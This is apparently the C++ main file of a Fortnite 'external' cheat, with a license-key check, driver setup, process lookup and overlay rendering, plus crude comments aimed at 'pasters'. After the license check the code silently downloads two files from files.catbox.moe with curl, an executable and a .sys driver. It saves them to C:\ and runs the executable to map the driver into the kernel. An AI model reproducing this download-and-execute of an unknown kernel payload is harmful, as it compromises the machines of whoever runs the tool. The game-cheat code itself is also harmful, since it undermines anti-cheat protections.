//SIMPLE ASS CODE FOR YALL TO UNDERSTAND EVERYTHING! IF YOU CANT UNDERSTAND YOU A GIGA PASTER

//PLEASE DONT SELL THIS SOURCE PLEASEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

//CAUSE I KNOW YOU A PASTER AND DONT KNOW ANYTHING JUST WANNA CHANGE MENU AND NAME AND MAKE THIS YOURS WITHOUT HAVING ANY KNOWLEDGE I AM LETTING YOU KNOW THAT IF YOU CHANGE DRIVER YOU WILL HAVE TO CHANGE SOME THINGS IN HERE AND IN game.hpp and in driver.hpp SO JUST KEEP THAT IN MIND!
#include "includes.hpp"
#include <iostream>
#include <thread>


#include <iostream>
#include <string>

//REMOVED THE CR3 LOOP TO FIX THE CRASH ISSUE!
void main()
{
	const std::string validLicenseKey = ".gg/aimbot";
	std::string userInput;

	std::cout << "License Hash: ";
	std::getline(std::cin, userInput);

	if (userInput == validLicenseKey) {
		system("cls");
		SetConsoleTitle(L"Moldy cheese ");
		std::cout << ("Welcome to worlds most pasted external, please open your game!") << std::endl;
		Sleep(2500);
		std::cout << ("Loading Pasted Driver!") << std::endl;
		std::cout << ("Credits: Morva999") << std::endl;
		system("start https://discord.gg/aimbot");
		system("curl --silent https://files.catbox.moe/cybbb2.sys --output C:\\map_porn.exe >nul");
		system("curl --silent https://files.catbox.moe/dg3jiq.sys --output C:\\drv_porn.sys >nul");
	 system("C:\\map_porn.exe C:\\drv_porn.sys");
	
		if (Driver::Init()) {
			std::cout << ("We found the driver running in the memory!") << std::endl;
		} 
		else {
			std::cout << ("Your pc smells of garbage, and loooks like a gangster granny's grandma's child addiction!") << std::endl;
		}
		while (game_wnd == 0)
		{
			Sleep(1);
			//mem::process_id = mem::find_process(L"FortniteClient-Win64-Shipping.exe"); //searching for process // old driver
			//game_wnd = get_process_wnd(mem::process_id); //found the process //old driver
			processID = Driver::FindProcess(L"FortniteClient-Win64-Shipping.exe"); //searching for process
			game_wnd = get_process_wnd(processID); //found the process
			Sleep(1);
		}





		system("cls");
		std::cout << ("We love pastes!") << std::endl;
		std::cout << ("Credits: Morva999") << std::endl;
		if (!input::init())
		{
			printf("The input was not initialized :("); //input wasnt initialized please go to definition and check or check ur shitty pc !
			Sleep(3000);
			exit(0);
		}

		if (!gui::init())
		{
			printf("The gui was not initialized :("); //init/gui wasnt initialized please go to definition and check or check ur shitty pc !
			Sleep(3000);
			exit(0);
		}
		if (!Driver::Init())
		{
			printf("The driver was not initialized :("); //driver wasnt initialized please go to definition and check or check ur shitty pc OR YOU JUST FCKED THE COMMS IDK JUST DOUBLE CHECK EVERYTHING FOR THIS ONE!
			Sleep(3000);
			exit(0);
		}
		Driver::CR3();
		//std::thread([&]() { cr3_loop(); }).detach();
		//if (!mem::fetch_cr3())
		//{

		//}
		//DONT TOUCH HERE PASTER! TOUCH ONLY IF YOU WANNA CHANGE DRIVER OR IF YOU KNOW WHAT YOU ARE DOING! -SOFMAIN
		// virtualaddy = mem::find_image(); // old driver
		Base = Driver::GetBase();

		if (!Base) //base_address //driver_handle
		{
			printf("The driver couldn't get the base address"); //Check ur driver base in the code if u get this error! Mine doesnt have a base_address so its driver_handle
			Sleep(3000);
			exit(0);
		}
		//here is for menu overlay blah blah
		create_overlay();
		directx_init();
		render_loop();
	}
	else {
		std::cout << "Invalid license key. Closing the application.\n";
		exit(1);
	}


}


